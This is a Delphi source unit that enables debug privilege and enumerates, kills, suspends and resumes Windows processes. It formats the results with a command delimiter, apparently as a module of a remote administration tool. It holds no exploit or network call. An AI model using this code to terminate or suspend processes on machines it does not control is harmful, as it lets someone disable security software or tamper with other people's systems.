Unit UnitProcess;

interface

uses
  Windows,
  ShellAPi,
  TLHelp32,
  psAPI;

function ProcessList: widestring;
function PidToPath(Pid: integer): widestring;
function KillProc(Pid: integer): boolean;
Function ResumeProcess(ProcessID: DWORD): Boolean;
function SuspendProcess(PID:DWORD): Boolean;

implementation

uses
  UnitConstantes;

function OpenThread(dwDesiredAccess: DWORD; bInheritHandle: BOOL; dwThreadId: DWORD): THandle; stdcall; external kernel32 Name 'OpenThread';

type
  P_TokenUser = ^User;
  User = record
    Userinfo: TSidAndAttributes;
  end;
  tUser = User;

type
  tagPROCESSENTRY32 = record
    dwSize: DWORD;
    cntUsage: DWORD;
    th32ProcessID: DWORD;       // this process
    th32DefaultHeapID: DWORD;
    th32ModuleID: DWORD;        // associated exe
    cntThreads: DWORD;
    th32ParentProcessID: DWORD; // this process's parent process
    pcPriClassBase: Longint;    // Base priority of process's threads
    dwFlags: DWORD;
    szExeFile: array[0..MAX_PATH - 1] of WChar;// Path
  end;
  TProcessEntry32 = tagPROCESSENTRY32;

const
  THREAD_TERMINATE            = ($0001);
  THREAD_SUSPEND_RESUME       = ($0002);
  THREAD_GET_CONTEXT          = ($0008);
  THREAD_SET_CONTEXT          = ($0010);
  THREAD_SET_INFORMATION      = ($0020);
  THREAD_QUERY_INFORMATION    = ($0040);
  THREAD_SET_THREAD_TOKEN     = ($0080);
  THREAD_IMPERSONATE          = ($0100);
  THREAD_DIRECT_IMPERSONATION = ($0200);
  THREAD_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED or SYNCHRONIZE or $3FF);

function IntToStr(i: Int64): WideString;
begin
  Str(i, Result);
end;

function StrToInt(S: WideString): Int64;
var
  E: integer;
begin
  Val(S, Result, E);
end;

function GetCreationTime(f: _filetime): WideString;
var
  SysTime: TSystemTime;
  Month, Day, Hour, Minute, Second: WideString;

  LocalHour: integer;
  SystemHour: integer;
  Diferenca: integer;
  Real: integer;
begin
  GetLocalTime(SysTime);
  LocalHour := systime.wHour;

  GetSystemTime(SysTime);
  SystemHour := systime.wHour;

  FileTimeToSystemTime(f, SysTime);

  Month := inttostr(systime.wMonth);
  Day := inttostr(systime.wDay);
  Hour := inttostr(Systime.wHour);
  Minute := inttostr(Systime.wMinute);
  Second := inttostr(systime.wSecond);

  if SystemHour > LocalHour then
  begin
    Diferenca := SystemHour - LocalHour;
    Real := systime.wHour - Diferenca;
    while Real > 24 do Real := Real - 24;
    while Real < 0 do Real := Real + 24;
    Hour := inttostr(Real);
  end else
  if SystemHour < LocalHour then
  begin
    Diferenca := LocalHour - SystemHour;
    Real := systime.wHour + Diferenca;
    while Real > 24 do Real := Real - 24;
    while Real < 0 do Real := Real + 24;
    Hour := inttostr(Real);
  end;

  if length(month) = 1 then month := '0' + month;
  if length(day) = 1 then day := '0' + day;
  if length(hour) = 1 then hour := '0' + hour;
  if hour = '24' then hour := '00';
  if length(minute) = 1 then minute := '0' + minute;
  if length(second) = 1 then second := '0' + second;
  Result :=  day + '/' + month + '/' + IntTostr(Systime.wYear) + ' ' + hour + ':' + minute + ':' + second;
end;

procedure SetTokenPrivileges(Priv: widestring);
var
  hToken1, hToken2: THandle;
  hToken3: cardinal;
  TokenPrivileges: TTokenPrivileges;
  Version: OSVERSIONINFO;
begin
  Version.dwOSVersionInfoSize := SizeOf(OSVERSIONINFO);
  GetVersionEx(Version);
  if Version.dwPlatformId <> VER_PLATFORM_WIN32_WINDOWS then
  begin
    try
      OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES, hToken1);
      hToken2 := hToken1;
      LookupPrivilegeValueW(nil,PWidechar(Priv), TokenPrivileges.Privileges[0].luid);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken1, False, TokenPrivileges, 0, PTokenPrivileges(nil)^, hToken3);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken2, False, TokenPrivileges, 0, PTokenPrivileges(nil)^, hToken3);
      CloseHandle(hToken1);
    except;
    end;
  end;
end;

function Process32First(hSnapshot: THandle; var lppe: TProcessEntry32): BOOL; stdcall; external 'kernel32.dll' name 'Process32FirstW';
function Process32Next(hSnapshot: THandle; var lppe: TProcessEntry32): BOOL; stdcall; external 'kernel32.dll' name 'Process32NextW';

function ProcessList: widestring;
var
  User, Domain, Usage, Created: widestring;
  proc: TProcessEntry32;
  snap: THandle;
  mCreationTime, mExitTime, mKernelTime, mUserTime: _FILETIME;
  HToken: THandle;
  rLength: Cardinal;
  ProcUser: P_Tokenuser;
  snu: SID_NAME_USE;
  ProcessHandle: THandle;
  UserSize, DomainSize: DWORD;
  bSuccess: Boolean;
  pmc: TProcessMemoryCounters;
  Buf: array[0..MAX_PATH] of widechar;
  location: widestring;
begin
  SetTokenPrivileges('SeDebugPrivilege');
  pmc.cb := SizeOf(pmc) ;
  snap := CreateToolHelp32SnapShot(TH32CS_SNAPALL,0);
  proc.dwSize := SizeOf(TProcessEntry32);

  Process32First(snap, proc);
  repeat
    ProcessHandle := OpenProcess(PROCESS_QUERY_INFORMATION or  PROCESS_VM_READ, False, proc.th32ProcessID);
    if ProcessHandle = 0 then begin
      Result := Result +
                proc.szExeFile + DelimitadorComandos +
                inttostr(Proc.th32ProcessID) + DelimitadorComandos +
                DelimitadorComandos +
                DelimitadorComandos +
                inttostr(Proc.cntThreads) + DelimitadorComandos +
                DelimitadorComandos + #13#10
    end else begin

      Location := '';
      if GetModuleFileNameExW(ProcessHandle, 0, Buf, MAX_PATH) > 0 then Location := Buf;

      if GetProcessMemoryInfo(Processhandle, @pmc, SizeOf(pmc)) then
      Usage := inttostr(pmc.WorkingSetSize) // div 1024)
      else Usage := '0';

      if GetProcessTimes(Processhandle, mCreationTime, mExitTime, mKernelTime, mUserTime) then
      Created := Getcreationtime(mcreationtime);

      if OpenProcessToken(ProcessHandle, TOKEN_QUERY, hToken) then
      begin
        bSuccess := GetTokenInformation(hToken, TokenUser, nil, 0, rLength);
        ProcUser  := nil;
        while (not bSuccess) and (GetLastError = ERROR_INSUFFICIENT_BUFFER) do
        begin
          ReallocMem(ProcUser,rLength);
          bSuccess:= GetTokenInformation(hToken,TokenUser,ProcUser,rLength,rLength);
        end;
        CloseHandle(hToken);

        UserSize := 0;
        DomainSize := 0;
        LookupAccountSid(nil, ProcUser.Userinfo.Sid, nil, UserSize, nil, DomainSize, snu);
        if (UserSize <> 0) and (DomainSize <> 0) then
        begin
          SetLength(User, UserSize);
          SetLength(Domain, DomainSize);
          if LookupAccountSid(nil, ProcUser.Userinfo.Sid, PChar(User), UserSize, PChar(Domain), DomainSize, snu) then
          begin
            User := PChar(User);
            Domain := PChar(Domain);
          end;
        end;
        FreeMem(ProcUser);
      end;
      CloseHandle(ProcessHandle);
      Result := Result + Proc.szExeFile + DelimitadorComandos;
      Result := Result + inttostr(Proc.th32ProcessID) + DelimitadorComandos;
      Result := Result + Location + DelimitadorComandos;
      Result := Result + User + DelimitadorComandos;
      Result := Result + inttostr(Proc.cntThreads) + DelimitadorComandos;
      Result := Result + Usage + DelimitadorComandos;
      Result := Result + created + DelimitadorComandos + #13#10;
    end;
  until not Process32Next(snap, proc);

  CloseHandle(snap);
end;

function PidToPath(Pid: integer): widestring;
var
  ProcessHandle: THandle;
  Buf: array[0..MAX_PATH] of widechar;
begin
  ProcessHandle := OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, False, Pid);
  GetModuleFileNameExW(ProcessHandle, 0, Buf, MAX_PATH);
  Result := WideString(Buf);
  CloseHandle(ProcessHandle);
end;

function KillProc(Pid: integer): boolean;
var
  Ph: integer;
begin
  Result := false;
  Ph := OpenProcess(PROCESS_TERMINATE, False, PID);
  if TerminateProcess(Ph, 0) then Result := true;
  CloseHandle(Ph);
end;

Function ResumeProcess(ProcessID: DWORD): Boolean;
var
  Snapshot,cThr: DWORD;
  ThrHandle: THandle;
  Thread: TThreadEntry32;
begin
  Result := False;
  cThr := GetCurrentThreadId;
  Snapshot := CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
  if Snapshot <> INVALID_HANDLE_VALUE then
   begin
    Thread.dwSize := SizeOf(TThreadEntry32);
    if Thread32First(Snapshot, Thread) then
     repeat
      if (Thread.th32ThreadID <> cThr) and (Thread.th32OwnerProcessID = ProcessID) then
       begin
        ThrHandle := OpenThread(THREAD_ALL_ACCESS, false, Thread.th32ThreadID);
        if ThrHandle = 0 then Exit;
        ResumeThread(ThrHandle);
        CloseHandle(ThrHandle);
       end;
     until not Thread32Next(Snapshot, Thread);
     Result := CloseHandle(Snapshot);
    end;
end;

function SuspendProcess(PID:DWORD): Boolean;
var
hSnap:  THandle;
THR32:  THREADENTRY32;
hOpen:  THandle;
begin
  Result := FALSE;
  hSnap := CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
  if hSnap <> INVALID_HANDLE_VALUE then
  begin
    THR32.dwSize := SizeOf(THR32);
    Thread32First(hSnap, THR32);
    repeat
      if THR32.th32OwnerProcessID = PID then
      begin
        hOpen := OpenThread($0002, FALSE, THR32.th32ThreadID);
        if hOpen <> INVALID_HANDLE_VALUE then
        begin
          Result := TRUE;
          SuspendThread(hOpen);
          CloseHandle(hOpen);
        end;
      end;
    until Thread32Next(hSnap, THR32) = FALSE;
    CloseHandle(hSnap);
  end;
end;

end.